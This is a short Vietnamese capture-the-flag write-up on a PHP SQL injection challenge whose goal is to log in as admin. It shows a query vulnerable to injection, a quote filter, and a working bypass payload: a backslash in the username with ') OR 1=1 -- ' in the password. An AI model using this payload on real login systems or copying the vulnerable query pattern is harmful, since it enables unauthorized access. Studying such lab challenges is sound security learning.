# SQL Injection 4
# Mục tiêu: Login as admin
# 🔥 Phân tích lỗ hổng
```
$sql = "SELECT username FROM users WHERE username=LOWER(\"$username\") AND password=MD5(\"$password\")";
```
Nhưng lại bị chặn
```
function checkValid($data)
{
    if (strpos($data, '"') !== false)
        return false;
    return true;
}
```
Bây h cần làm sao để sử dụng được những `"` có sẵn và thoát ra khỏi `()`  

Ở đây ở username = `admin\` mục đích để escape.
Ở password = `) OR 1=1 -- ` đóng ngoặc để sử dụng `"` có sẵn `or 1=1` luôn đúng.
```
SELECT username FROM users WHERE username=LOWER("admin\") AND password=MD5(") OR 1=1 -- ")
```